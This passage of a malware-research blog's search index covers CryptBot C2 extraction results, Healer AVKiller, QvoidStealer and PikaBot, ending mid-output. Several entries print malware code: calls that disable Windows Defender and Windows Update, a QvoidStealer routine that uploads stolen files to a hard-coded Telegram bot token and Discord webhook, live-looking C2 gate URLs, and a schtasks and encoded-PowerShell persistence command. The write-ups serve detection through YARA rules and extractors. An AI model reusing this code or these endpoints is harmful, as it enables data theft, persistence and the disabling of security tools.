/tmp/samples/6cc65eb24b4ca1e5114b54ee233c2f0cbfb94027a15acda7afc6145568a48956 http://trenio65.top/gate.php; None /tmp/samples/daa64610c5eaed232802858540f4084f70c45fed4ef6c389639f6890999216b7 http://ewzvpq52.top/gate.php; None /tmp/samples/c515e59148e526a3eb95abf2b80b59ccad556b9a343e1ee377e962739c84d816 http://lahxam72.top/gate.php; None /tmp/samples/cfc7e9c6a2f034d1c8526bbb8b080b7a60868f5fd1dc99bb50dab34f53a5617d http://xjupom52.top/gate.php; None /tmp/samples/d0870aca3b4a3bb20886f8187146badf97a6b58137aa4091d6a163870e9cb24b http://ewzmix42.top/gate.php; None /tmp/samples/bfb5bf361c6cf10444d15950a186ab3430369f3c5f5365610b6c1507dcb4d74e ERROR /tmp/samples/cff473cf9ddd2cc651e2058928c255cd8e23266ab517478aa20f2ca7d1566c3a ERROR /tmp/samples/38263337d1751f59525e383cc17f87d44abc32394e2c82dee460dc88d6a441d0 ERROR /tmp/samples/66bc0cd0343be9eb0b30e068e906fc16d1e99cdf21a940950988d79bc0573aee http://xjuupt72.top/gate.php; None /tmp/samples/28e09347b5ccc3eaf3ce9670b7061210f7dd63e4627fad7a805878e774a48e78 ERROR list index out of range /tmp/samples/22075a63aef35075b6a7bf3eb1f3ba9ccccfec7fc90f7925c1f02f7747a938ce http://yawvtr72.top/gate.php; None /tmp/samples/a04e8c97dac994a7b5954362f0670cc647026b9ecb5f60f8d1b7c5984556e197 ERROR /tmp/samples/cd0b222baefe6b0246907ff4c082f4653c93c3c0c220c8c78a5ba316d760be1e http://ewzjvx32.top/gate.php; None /tmp/samples/82c38736da805cc142e27926680d06d31ec733d2f3930b4fa0f857ac98774c10 ERROR /tmp/samples/ce3f93e47845e2b665a5505c29de94f5f5029ff6b108bb8c09a1f138e1d6597e ERROR /tmp/samples/fefa4e0170a001f1875cc357c745c00cf1557f126abdb81fa739fc12d279ca7f http://lahsfr12.top/gate.php; None /tmp/samples/65c277ca5ba40e11db36dc51fdfd036ef9778c55edea6a8e98c9b6ba04a2b1b6 ERROR /tmp/samples/277ef9b811aca7a6e7dd1574b68d280d576cab8770cfe1c495a051a9739e2358 ERROR /tmp/samples/ace4d349300a37250a1d76a00a8b241d82a6c8cca5676011bb4bdbb295f5f9f3 ERROR /tmp/samples/cdf256f6a714e539a54952df7524f277d079606bbfb6c108b34fc17d268c0b15 ERROR /tmp/samples/828515a42c0e7db8faf64f062f83f753a6fccbb7052e0e3238ca5d5e928f7215 ERROR /tmp/samples/39a9db0ecee2824dbb62ed1a06f675fd0fffe7cfb8074581d9c1ea1a3cf20cd7 http://ernlen22.top/gate.php; None /tmp/samples/eb96e80c723c8b351930589c9413d265bf3416f75649676de6d94bc431f07693 ERROR /tmp/samples/30fa111f7f2b020edbe5d1ee5a7e62494c4ac3161a99e6bbfb07f477f5acfa64 ERROR /tmp/samples/1624b18bb44aa9f1f7d2e9aa48e74c693455fc1eccc1d0b1469f27d4d6c006bd ERROR /tmp/samples/d4cbaa220dd19b9e4f25f0415837d9547ac975e7526fa434eaa6e0db1a8a333e http://quwtdc72.top/gate.php; None /tmp/samples/e7639c2a22b8c467be67f5d847c1a18c77451e87b287ccf16acd19e3f18fec71 http://xjustw22.top/gate.php; None /tmp/samples/71abbc801d92086b20929e988a66cd2fb78abf8bb73f670dd7973102f64bd991 ERROR /tmp/samples/2311089547a7ffa27cd0c8129dba3e0eb2086feae4d8113da55d5bf3e34baf21 ERROR /tmp/samples/775cfdbd07e34efd365efd84defdca572b6f611183003f4223ec67ece4fa9a16 ERROR /tmp/samples/41bc80901eabb49a2e9b1d384d213ff7418a8c1efc2366af6a264eebcd7f423f ERROR /tmp/samples/e7a72071085ca3be73c47f5b7b582874ac09cf3a66216823440d98dba0a44221 ERROR list index out of range /tmp/samples/bc56fd3f2052ee668b0a850b33b2017de51a21b3d3c4ff0904a2da5caf1d400d ERROR /tmp/samples/0e99abfb5d04c8d2896a5c1b585a7ae728508a775adcea2a441d50406882b7ed ERROR /tmp/samples/00f9cbe4b91fe5d2ae34aa1b29d3baa5ddf9bb84fb28d65270665ca454b4fa2c http://xjulqa12.top/gate.php; None /tmp/samples/130aeda14ea655ef6186420c8655bd2f92a875d0ea3089a40f3bc550deef84b5 http://xjupom52.top/gate.php; None /tmp/samples/9ccd1ac9a965d09a74e753c262e02fb3f413cd8f103e3aad0978634bb005e785 http://lahdlk32.top/gate.php; None /tmp/samples/3ac544d58365a618c777ff55f57403fde19fc3ff13ba1859a4c410a657ac4164 ERROR /tmp/samples/e501d6ff65fdadc0e05a842652290f4d66cd4e2791f047816e86a2c57262880e ERROR /tmp/samples/62e1d6730f4b657f592f88ff74d6b3656d7d3f05fb6c1f06a2061cf5c3080200 ERROR /tmp/samples/2805c1a81174e671123118e1d204b41f09c182f14d7ad01c7283fb7addea9b91 http://ernblt32.top/gate.php; None /tmp/samples/134ee19e860f2c229787a6e2b954c79bde7831e4865f27c00ca9c84fcb0e2c1f http://trenio65.top/gate.php; None /tmp/samples/7176c6e5e8bad8e91d2ce9fb694bb261daa371b39e2af274bb0e8d15f996043b ERROR /tmp/samples/ecaf51ccb3476a0077ba18eac41d9efc9939c00e10eebf6155ff8695594a7052 ERROR /tmp/samples/66995600f5b4291a2bbab619926e7df878b7955b3b5f8c957701feee59855a60 ERROR list index out of range .",
            "url": "https://research.openanalysis.net/cryptbot/botnet/yara/config/2023/03/16/cryptbot.html",
            "relUrl": "/cryptbot/botnet/yara/config/2023/03/16/cryptbot.html",
            "date": " ‚Ä¢ Mar 16, 2023"
        }
        
    
  
    
        ,"post17": {
            "title": "Healer AVKiller",
            "content": "Overview . This small .NET hacking tool is often deployed along side Redline Stealer and is used to disable antivirus. . Samples . 976ba54ff3f8ab4c1d6fe5629460b1fc42106495ddb3151b52951030069b6d47 UnpacMe Analysis | 850cd190aaeebcf1505674d97f51756f325e650320eaf76785d954223a9bee38 UnpacMe Analysis | a4f91172441b827b1e0cc6d7fb58d904fb5dd3bca64f08be24c431db2fdcca6d UnpacMe Analysis | . Analysis . When launched the binary first elevates to SYSTEM using token impersonation with the winlogon token, then it migrates to TrustedInstaller using the TrustedInstaller service token. With TrustedInstaller permissions it gains full access to the protected registry keys and services such as those used by Windows Defender. This is a well documented elevation tactic that is decribed in the 2017 blog post The Art of Becoming TrustedInstaller. . Windows Defender Targets . The following registry keys and services are dissabled. . Program.DisableService(&quot;WinDefend&quot;); Program.RegistryEdit(&quot;SOFTWARE Microsoft Windows Defender Features&quot;, &quot;TamperProtection&quot;, &quot;0&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows Defender&quot;, &quot;DisableAntiSpyware&quot;, &quot;1&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows Defender Real-Time Protection&quot;, &quot;DisableBehaviorMonitoring&quot;, &quot;1&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows Defender Real-Time Protection&quot;, &quot;DisableIOAVProtection&quot;, &quot;1&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows Defender Real-Time Protection&quot;, &quot;DisableOnAccessProtection&quot;, &quot;1&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows Defender Real-Time Protection&quot;, &quot;DisableRealtimeMonitoring&quot;, &quot;1&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows Defender Real-Time Protection&quot;, &quot;DisableScanOnRealtimeEnable&quot;, &quot;1&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows Defender Security Center Notifications&quot;, &quot;DisableNotifications&quot;, &quot;1&quot;); Program.DisableService(&quot;wuauserv&quot;); Program.DisableService(&quot;WaaSMedicSvc&quot;); Program.DisableService(&quot;UsoSvc&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows WindowsUpdate AU&quot;, &quot;AUOptions&quot;, &quot;2&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows WindowsUpdate AU&quot;, &quot;AutoInstallMinorUpdates&quot;, &quot;0&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows WindowsUpdate AU&quot;, &quot;NoAutoUpdate&quot;, &quot;1&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows WindowsUpdate AU&quot;, &quot;NoAutoRebootWithLoggedOnUsers&quot;, &quot;1&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows WindowsUpdate AU&quot;, &quot;UseWUServer&quot;, &quot;1&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows WindowsUpdate&quot;, &quot;DoNotConnectToWindowsUpdateInternetLocations&quot;, &quot;1&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows WindowsUpdate&quot;, &quot;WUStatusServer&quot;, &quot;server.wsus&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows WindowsUpdate&quot;, &quot;WUServer&quot;, &quot;server.wsus&quot;); Program.RegistryEdit(&quot;SOFTWARE Policies Microsoft Windows WindowsUpdate&quot;, &quot;UpdateServiceUrlAlternate&quot;, &quot;server.wsus&quot;); .",
            "url": "https://research.openanalysis.net/healer/avkiller/dotnet/trustedinstaller/2023/03/15/healer-avkiller.html",
            "relUrl": "/healer/avkiller/dotnet/trustedinstaller/2023/03/15/healer-avkiller.html",
            "date": " ‚Ä¢ Mar 15, 2023"
        }
        
    
  
    
        ,"post18": {
            "title": "QvoidStealer",
            "content": "Overview . This is an open source stealer (lol) that is being dropped along side Redline. We are going to take a quick look and build some yara rules and maybe a config extractor. . Samples . ef7bb2464a2b430aa98bd65a1a40b851b57cb909ac0aea3e53729c0ff900fa42 UnpacMe Analysis | . References . GitHub Source | . Analysis . There is no config the config values are hard coded into the malware in the Settings class. . // Token: 0x0400005B RID: 91 public static DiscordWebhook Webhook = new DiscordWebhook(&quot;https://discord.com/api/webhooks/1018147363531014255/uKi-k3i3zSVEkAUaQlsmJRCYATrY2kAsY06YGJ38v8lpW7BvMV3LdjJR8N1F18izeOoL&quot;); // Token: 0x0400005C RID: 92 public static TelegramAPI Telegram = new TelegramAPI(&quot;%TELEGRAM_TOKEN_HERE%&quot;, 0UL); // Token: 0x0400005D RID: 93 public static CryptoClipper Clipper = new CryptoClipper(&quot;BTC_ADDRESS_HERE_&quot;, &quot;ETH_ADDRESS_HERE_&quot;, &quot;DODGE_ADDRESS_HERE_&quot;, &quot;LTC_ADDRESS_HERE_&quot;, &quot;XMR_ADDRESS_HERE_&quot;, &quot;DASH_ADDRESS_HERE_&quot;, &quot;NEO_ADDRESS_HERE_&quot;, &quot;XRP_ADDRESS_HERE_&quot;); . In addition to the &quot;settings&quot; there is also a hard coded telegram link in the Grabber class, used to upload a zip of the stolen info. . { MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent(); byte[] array3 = File.ReadAllBytes(text11); multipartFormDataContent.Add(new ByteArrayContent(array3, 0, array3.Length), &quot;Document&quot;.ToLower(), Environment.UserName + &quot;-REPORT.zip&quot;); httpClient.PostAsync(&quot;https://api.telegram.org/bot5782836382:AAHNuZVXqfrDOZvUuZDvx1SNqBnGmTN8Kio/sendDocument?chat_id=2024893777&quot;, multipartFormDataContent).Wait(); httpClient.Dispose(); } . Yara Rules . @dr4k0nia sent us this rule that will match on the silly anti-dumping features of the malware. She also poste this to GitHub. . import &quot;dotnet&quot; rule msil_obf_antidump { meta: author = &quot;dr4k0nia&quot; version = &quot;1.0&quot; date = &quot;12/03/2023&quot; hash = &quot;ef7bb2464a2b430aa98bd65a1a40b851b57cb909ac0aea3e53729c0ff900fa42&quot; strings: $import0 = &quot;ZeroMemory&quot; $import1 = &quot;VirtualProtect&quot; $importt2 = &quot;GetCurrentProcess&quot; // Managed import $array0 = {1D 8D 9E 00 00 01 25 D0 67 00 00 04 28 CF 01 00 0A 80 84 00 00 04} $array1 = {1F 0C 8D 9E 00 00 01 25 D0 65 00 00 04 28 CF 01 00 0A 80 86 00 00 04} $array2 = {1F 1B 8D 9E 00 00 01 25 D0 66 00 00 04 28 CF 01 00 0A 80 87 00 00 04} condition: uint16(0) == 0x5a4d and dotnet.is_dotnet and all of($import*) and all of($array*) } . We also created this lame strings based rule . import &quot;dotnet&quot; rule qvoidstealer { strings: $s1 = &quot;Some retard who thinks he can reverse this application.&quot; ascii wide $s2 = &quot;QvoidStealer&quot; wide $m1 = &quot;AntiDebug&quot; wide $m2 = &quot;AntiEmulation&quot; wide $m3 = &quot;AntiSandBoxie&quot; wide $m4 = &quot;AntiVM&quot; wide $m5 = &quot;AntiWebSniffers&quot; wide $m6 = &quot;Clipper&quot; wide $m7 = &quot;Webhook&quot; wide condition: uint16(0) == 0x5a4d and dotnet.is_dotnet and ( 1 of ($s*) or all of ($m*) ) } . Config Extractor . (don&#39;t judge me!) . import re data = open(&#39;/tmp/what.bin&#39;, &#39;rb&#39;).read() . def unicode_strings(buf, n=4): import re ASCII_BYTE = b&#39; ! &quot;# $%&amp; &#39; ( ) * +,- ./0123456789:;&lt;=&gt; ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] ^_`abcdefghijklmnopqrstuvwxyz { | } ~ t&#39; if type(buf) == str: buf = buf.encode(&#39;utf-8&#39;) reg = b&#39;((?:[%s] x00){%d,})&#39; % (ASCII_BYTE, n) uni_re = re.compile(reg) out = [] for match in uni_re.finditer(buf): try: out.append(match.group().decode(&quot;utf-16&quot;)) except UnicodeDecodeError: pass return out strings = unicode_strings(data) . telegram_egg = r&#39;https: / /api .telegram .org[^ ?]* ?chat_id=[0-9]+&#39; discord_egg = r&#39;https: / /discord .com /api /webhooks /[^ n]*&#39; c2s = [] for m in re.finditer(telegram_egg, (&#39; n&#39;).join(strings), re.DOTALL): c2s.append(m.group()) for m in re.finditer(discord_egg, (&#39; n&#39;).join(strings), re.DOTALL): c2s.append(m.group()) c2s . [&#39;https://api.telegram.org/bot5782836382:AAHNuZVXqfrDOZvUuZDvx1SNqBnGmTN8Kio/sendDocument?chat_id=2024893777&#39;, &#39;https://discord.com/api/webhooks/1018147363531014255/uKi-k3i3zSVEkAUaQlsmJRCYATrY2kAsY06YGJ38v8lpW7BvMV3LdjJR8N1F18izeOoL&#39;] . Notes . Discord De-Anonymization . Can we determin the discord server based on the the webhook? . https://discord.com/api/webhooks/1018147363531014255/uKi-k3i3zSVEkAUaQlsmJRCYATrY2kAsY06YGJ38v8lpW7BvMV3LdjJR8N1F18izeOoL . If we call the webhook the response is .... . { &quot;type&quot;: 1, &quot;id&quot;: &quot;1018147363531014255&quot;, &quot;name&quot;: &quot;Clown&quot;, &quot;avatar&quot;: null, &quot;channel_id&quot;: &quot;1018147299177807935&quot;, &quot;guild_id&quot;: &quot;1018147298502516836&quot;, &quot;application_id&quot;: null, &quot;token&quot;: &quot;uKi-k3i3zSVEkAUaQlsmJRCYATrY2kAsY06YGJ38v8lpW7BvMV3LdjJR8N1F18izeOoL&quot; } . This site looks promising discordlookup but it didn&#39;t return anything. . We can also interrogate the snowflake using toolscord . Server Created: Saturday, September 10, 2022 at 9:13:52 AM EDT . Thomas also found this interesting endpoint to query https://discord.com/api/v9/users/@me/guilds/1018147298502516836/settings . { &quot;guild_id&quot;: &quot;1018147298502516836&quot;, &quot;suppress_everyone&quot;: false, &quot;suppress_roles&quot;: false, &quot;mute_scheduled_events&quot;: false, &quot;message_notifications&quot;: 0, &quot;flags&quot;: 0, &quot;mobile_push&quot;: true, &quot;muted&quot;: false, &quot;mute_config&quot;: null, &quot;hide_muted_channels&quot;: false, &quot;channel_overrides&quot;: [ { &quot;channel_id&quot;: &quot;885624530071085097&quot;, &quot;message_notifications&quot;: 3, &quot;muted&quot;: true, &quot;mute_config&quot;: { &quot;end_time&quot;: null, &quot;selected_time_window&quot;: -1 }, &quot;collapsed&quot;: false } ], &quot;notify_highlights&quot;: 0, &quot;version&quot;: 3642 } . Telegram De-Anonymization . What about getting the telegram channel from the bot chat id? . https://api.telegram.org/bot5782836382:AAHNuZVXqfrDOZvUuZDvx1SNqBnGmTN8Kio/sendDocument?chat_id=2024893777 . We can try the getMe command to get more info but the bot seems to be dead. . https://api.telegram.org/bot5782836382:AAHNuZVXqfrDOZvUuZDvx1SNqBnGmTN8Kio/getMe .",
            "url": "https://research.openanalysis.net/qvoidstealer/yara/dotnet/stealer/2023/03/12/qvoid-stealer.html",
            "relUrl": "/qvoidstealer/yara/dotnet/stealer/2023/03/12/qvoid-stealer.html",
            "date": " ‚Ä¢ Mar 12, 2023"
        }
        
    
  
    
        ,"post19": {
            "title": "PikaBot",
            "content": "Overview . References . PikaBot and the Matanbuchus connection | Tweet from @1ZRR4H | . After this was published there was another blog whta didn&#39;t name the sample on this malware. . Beepin‚Äô Out of the Sandbox: Analyzing a New, Extremely Evasive Malware | . Samples . Loader . Sample 1 . Packed: 67c61f649ec276eb57fcfe70dbd6e33b4c05440ee10356a3ef10fad9d0e224ef UnpacMe Analysis . Unpacked: 05d1b791865c9551ed8da6a170eb6f945a4d1e79cb70341f589cc47bacf78cc3 . Sample 2 . Packed: c666aeb7ed75e58b645a2a4d1bc8c9d0a0a076a8a459e33c6dc60d12f4fa0c01 UnpacMe Analysis . Unpacked: 8528b4fbb050be27debef474bd27d441d92196f5d19840f94afa979e8483c8ef . Core . 59f42ecde152f78731e54ea27e761bba748c9309a6ad1c2fd17f0e8b90f8aed1 UnpacMe Analysis . Analysis . Something is weird with the dll (did we unpack it wrong?) when run we don&#39;t call the entrypoint for some reason? | There is a simple API hashing algo used to hash two APIs (GetProcAddress,LoadLibraryA) to construct a dynamic API resolve function | API names are protected as encrypted stack strings | . String Decryption . from dumpulator import Dumpulator dp = Dumpulator(&quot;/tmp/pika2.dmp&quot;, quiet=True) print(&#39;loaded&#39;) . loaded . dll_base = 0x00540000 dp.start(0x005A2013, end=0x005A203A) print(&#39;done&#39;) . done . dp.read(dp.regs.ebp - 0x1c, 12) . bytearray(b&#39;Kernel32.dll&#39;) . dp = Dumpulator(&quot;/tmp/pika2.dmp&quot;, quiet=True) print(&#39;loaded&#39;) dp.start(0x005A2041, end=0x00005A206E) print(&#39;done&#39;) . loaded done . dp.read(dp.regs.edx, 12) . bytearray(b&#39;User32.dll x00w&#39;) . DLL Names . The API resolving function passes a flag in the first argument which is used to select one of three hard-coded DLLs to load APIs from. The DLL names are hard coded as encrypted stack strings. . 1 -&gt; Kernel32.dll 2 -&gt; User32.dll 6 -&gt; Advapi32.dll . Strings . For automatic stack string detection and decryption we need the following. . detect where to start emulation | detect where to stop emulation | detect the var/reg where the decrypted stack string is located | . . 33 D2 xor edx, edx C7 45 EC 93 A4 A6 8E mov [ebp+var_14], 8EA6A493h C7 45 F0 B1 A4 AF 8A mov [ebp+var_10], 8AAFA4B1h 8B CA mov ecx, edx C7 45 F4 A4 B8 84 B9 mov [ebp+var_C], 0B984B8A4h C6 45 F8 96 mov [ebp+var_8], 96h ; &#39;‚Äì&#39; 8A 44 0D EC mov al, byte ptr [ebp+ecx+var_14] 34 C1 xor al, 0C1h 88 44 0D D0 mov [ebp+ecx+var_api_name], al 41 inc ecx 83 F9 0D cmp ecx, 0Dh 7C F0 jl short loc_5A109B 88 55 DD mov [ebp+var_23], dl . Algorithm . For each function walk all basic blocks (bb) . | If a bb ends with a jl this is a candidate for string decryuption &quot;end block&quot; . | The prev block is then assumed to be the stack string setup block or the &quot;start block&quot; . | Record both the start and end addresses . | The stack string location is assumed to be the last mov instruction before the jl, to fide this we can just iterate backwards from the jl until we hit the first mov . | . IDA Get Operand Offset . When we have an operand that had an offset instead of a direct reg or imm it is a bit tricky to get the actual offset. This code can help! . Example. . 88 44 0D D0 mov [ebp+ecx+var_30], al . We want to get the var_30 offset value, but we also want to get the ebp and ecx registers. If we just want to the var_30 offset we can use the following. . A good IDA ref for how instructions are parsed can be found here (thanks Robert Yates .... psyco killer na na na na . A quick way. . idc.get_operand_value(ea, 0) -&gt; 0xffffffd0 -&gt; twos_complement() -&gt; -0x30 . def twos_complement(value, bits): if value &amp; (1 &lt;&lt; (bits - 1)): value -= 1 &lt;&lt; bits return value twos_complement(idc.get_operand_value(ea, 0), 32) . If we want to do a more in-depth invesitgation of the operand structure we can use the following . import idaapi import ctypes ea = 0x5a10a1 insn = idaapi.insn_t() insnLen = idaapi.decode_insn(insn, ea) op = insn.ops[0] print(hex(ctypes.c_int(op.addr).value)) . Putting it all together.... . import idaapi import ctypes def get_operand_offset(ea): op_offset = idc.get_operand_value(ea, 0) return ctypes.c_int(op_offset).value . Find Stack Strings . import idautils import idaapi import idc import ctypes def get_operand_offset(ea): op_offset = idc.get_operand_value(ea, 0) return ctypes.c_int(op_offset).value def parse_fn(test_fn): # {&#39;start&#39;,&#39;end&#39;,&#39;op_offset&#39;} out = [] f = ida_funcs.get_func(test_fn) fc = list(idaapi.FlowChart(f, flags=idaapi.FC_PREDS)) for block_ptr in range(len(fc)): block = fc[block_ptr] print(f&quot;Basic Block: {hex(block.start_ea)}&quot;) last_inst = idc.prev_head(block.end_ea) print(f&quot;Last isn {hex(last_inst)}&quot;) if idc.print_insn_mnem(last_inst) == &#39;jl&#39;: print(f&quot;Found decryption block {hex(block.start_ea)}&quot;) # End of stack string builder is start of next block stack_string_end = block.end_ea # Prev block start is the start of the stack string builder prev_block = fc[block_ptr - 1] stack_string_start = prev_block.start_ea # The last mov instruction before the end of the decryption loop # is the stack string var isn_ptr = last_inst while isn_ptr &gt;= block.start_ea: isn_ptr = idc.prev_head(isn_ptr) if idc.print_insn_mnem(isn_ptr) == &quot;mov&quot;: print(f&quot;Found the stack var at address {hex(isn_ptr)}&quot;) op_offset = get_operand_offset(isn_ptr) out.append({&#39;start&#39;:stack_string_start, &#39;end&#39;:stack_string_end, &#39;op_offset&#39;:op_offset}) break return out stack_strings = [] for f in idautils.Functions(): out = parse_fn(f) stack_strings += out print(stack_strings) . stack_strings = [{&#39;start&#39;: 5902456, &#39;end&#39;: 5902507, &#39;op_offset&#39;: -48}, {&#39;start&#39;: 5902507, &#39;end&#39;: 5902578, &#39;op_offset&#39;: -100}, {&#39;start&#39;: 5902651, &#39;end&#39;: 5902714, &#39;op_offset&#39;: -44}, {&#39;start&#39;: 5902793, &#39;end&#39;: 5902851, &#39;op_offset&#39;: -496}, {&#39;start&#39;: 5902851, &#39;end&#39;: 5902983, &#39;op_offset&#39;: -920}, {&#39;start&#39;: 5902983, &#39;end&#39;: 5903051, &#39;op_offset&#39;: -512}, {&#39;start&#39;: 5903051, &#39;end&#39;: 5903096, &#39;op_offset&#39;: -400}, {&#39;start&#39;: 5903096, &#39;end&#39;: 5903151, &#39;op_offset&#39;: -584}, {&#39;start&#39;: 5903151, &#39;end&#39;: 5903256, &#39;op_offset&#39;: -648}, {&#39;start&#39;: 5903256, &#39;end&#39;: 5903317, &#39;op_offset&#39;: -560}, {&#39;start&#39;: 5903317, &#39;end&#39;: 5903362, &#39;op_offset&#39;: -412}, {&#39;start&#39;: 5903362, &#39;end&#39;: 5903947, &#39;op_offset&#39;: -1364}, {&#39;start&#39;: 5903947, &#39;end&#39;: 5904084, &#39;op_offset&#39;: -1000}, {&#39;start&#39;: 5904084, &#39;end&#39;: 5904190, &#39;op_offset&#39;: -840}, {&#39;start&#39;: 5904190, &#39;end&#39;: 5904288, &#39;op_offset&#39;: -776}, {&#39;start&#39;: 5904288, &#39;end&#39;: 5904395, &#39;op_offset&#39;: -712}, {&#39;start&#39;: 5904395, &#39;end&#39;: 5904475, &#39;op_offset&#39;: -136}, {&#39;start&#39;: 5904475, &#39;end&#39;: 5904520, &#39;op_offset&#39;: -76}, {&#39;start&#39;: 5904520, &#39;end&#39;: 5904580, &#39;op_offset&#39;: -20}, {&#39;start&#39;: 5904580, &#39;end&#39;: 5904636, &#39;op_offset&#39;: -64}, {&#39;start&#39;: 5904636, &#39;end&#39;: 5904799, &#39;op_offset&#39;: -308}, {&#39;start&#39;: 5904799, &#39;end&#39;: 5904869, &#39;op_offset&#39;: -544}, {&#39;start&#39;: 5905068, &#39;end&#39;: 5905134, &#39;op_offset&#39;: -528}, {&#39;start&#39;: 5905134, &#39;end&#39;: 5905203, &#39;op_offset&#39;: -192}, {&#39;start&#39;: 5905356, &#39;end&#39;: 5905425, &#39;op_offset&#39;: -48}, {&#39;start&#39;: 5905811, &#39;end&#39;: 5905870, &#39;op_offset&#39;: -128}, {&#39;start&#39;: 5905870, &#39;end&#39;: 5905915, &#39;op_offset&#39;: -44}, {&#39;start&#39;: 5905915, &#39;end&#39;: 5905960, &#39;op_offset&#39;: -32}, {&#39;start&#39;: 5906451, &#39;end&#39;: 5906490, &#39;op_offset&#39;: -28}, {&#39;start&#39;: 5906497, &#39;end&#39;: 5906535, &#39;op_offset&#39;: -12}, {&#39;start&#39;: 5906549, &#39;end&#39;: 5906588, &#39;op_offset&#39;: -28}] def emulate(start, end, op_offset): dp = Dumpulator(&quot;/tmp/pika2.dmp&quot;, quiet=True) print(&#39;loaded&#39;) dp.start(start, end=end) print(&#39;done&#39;) str_len = dp.regs.ecx if str_len &gt; 2: if dp.read(dp.regs.ebp + op_offset, 2)[1] == 0: out = dp.read(dp.regs.ebp + op_offset, str_len * 2) out = out.replace(b&#39; x00&#39;,b&#39;&#39;) else: out = dp.read(dp.regs.ebp + op_offset, str_len) else: out = dp.read(dp.regs.ebp + op_offset, str_len) return out labels = {} for ss in stack_strings: try: out = emulate(ss.get(&#39;start&#39;), ss.get(&#39;end&#39;),ss.get(&#39;op_offset&#39;)) if out.isascii(): print(f&quot;{hex(ss.get(&#39;start&#39;))}: {out.decode(&#39;utf-8&#39;)}&quot;) labels[ss.get(&#39;start&#39;)] = out.decode(&#39;utf-8&#39;) else: print(f&quot;ERROR: {hex(ss.get(&#39;start&#39;))}: {out}&quot;) except: print(f&quot;TOTAL FAILURE: {hex(ss.get(&#39;start&#39;))}&quot;) print(labels) . loaded done 0x5a1078: RegOpenKeyExW loaded done 0x5a10ab: HARDWARE ACPI DSDT VBOX__ loaded done 0x5a113b: GetUserDefaultLangID loaded done 0x5a11c9: CreateMutexW loaded done 0x5a1203: {8B30B3CD-2068-4F75-AB1F-FCAE6AF928B6} loaded done 0x5a1287: GetLastError loaded done 0x5a12cb: wsprintfW loaded done 0x5a12f8: SOFTWARE %s loaded done ERROR: 0x5a132f: bytearray(b&#39; x05 x06 x05 t xfc n n x0b xf8 x05 x0b xe6 x0c x0b x03 r xfc n xdb xfa x0b xf8 x0b x06 t xf8 x03&#39;) loaded done 0x5a1398: RegCreateKeyExW loaded done 0x5a13d5: wsprintfW loaded done 0x5a1402: schtasks.exe /Create /F /TN &#34;%s&#34; /TR &#34; cmd /q /c start /min &#34; &#34; powershell &#34;$%s = Get-ItemProperty -Path HKCU: Software %s; powershell -encodedcommand $%s.%s &#34;&#34; /SC MINUTE /MO %s loaded done 0x5a164b: {8B30B3CD-2068-4F75-AB1F-FCAE6AF928B6} loaded done ERROR: 0x5a16d4: bytearray(b&#39; x00 x81 x00 x81 x00 x81 x08 x81H x80 x08 x81 x00 x81 x08 x81 x08 x81H x80 x00 x81 x08 x81@ x80 x08 x81 x08 x81 x00&#39;) loaded done 0x5a173e:       loaded done ERROR: 0x5a17a0: bytearray(b&#39; x00 x80 x00 x80 x00 x80 x08 x80H x81 x08 x80 x00 x80 x08 x80 x08 x80H x81 x00 x80 x08 x80@ x81 x08 x80 x08 x80 x00&#39;) loaded done 0x5a180b: @@H@HHH@H@HH@@@@H loaded done 0x5a185b:    loaded done 0x5a1888: GetModuleFileNameW loaded done 0x5a18c4: wsprintfW loaded done 0x5a18fc: @H@H@@HH@HH@@HHH@@@@@@ loaded done 0x5a199f: CreateProcessW loaded done 0x5a1aac: RegSetValueExW loaded done 0x5a1aee: loaded done 0x5a1bcc: RegCloseKey loaded done 0x5a1d93: CreateProcessW loaded initial unmapped read from 8df790[1], cip = 5a1dce, exception: ExceptionType.Memory, (0x5a1dce, 0x2d, 12) final unmapped read from 8df790[1], cip = 5a1deb, exception: ExceptionType.Memory, (0x5a1deb, 0x10, 6) . Traceback (most recent call last): File &#34;/Users/herrcore/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/dumpulator.py&#34;, line 1329, in _hook_syscall status = syscall_impl(dp, *args) File &#34;/Users/herrcore/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/ntsyscalls.py&#34;, line 2888, in ZwQueryInformationJobObject raise NotImplementedError() NotImplementedError . Exception thrown during syscall implementation, stopping emulation! forced exit memory operation 21 of 4fe2[1] = 0 TOTAL FAILURE: 0x5a1dce loaded initial unmapped read from 8df790[1], cip = 5a1dfb, exception: ExceptionType.Memory, (0x5a1dfb, 0x2d, 12) final unmapped read from 8df790[1], cip = 5a1e18, exception: ExceptionType.Memory, (0x5a1e18, 0x10, 6) . Traceback (most recent call last): File &#34;/Users/herrcore/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/dumpulator.py&#34;, line 1329, in _hook_syscall status = syscall_impl(dp, *args) File &#34;/Users/herrcore/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/ntsyscalls.py&#34;, line 2888, in ZwQueryInformationJobObject raise NotImplementedError() NotImplementedError . Exception thrown during syscall implementation, stopping emulation! forced exit memory operation 21 of 4fe2[1] = 0 TOTAL FAILURE: 0x5a1dfb loaded done 0x5a2013: Kernel32.dll loaded done 0x5a2041: User32.dll loaded done 0x5a2075: Advapi32.dll {5902456: &#39;RegOpenKeyExW&#39;, 5902507: &#39;HARDWARE ACPI DSDT VBOX__&#39;, 5902651: &#39;GetUserDefaultLangID&#39;, 5902793: &#39;CreateMutexW&#39;, 5902851: 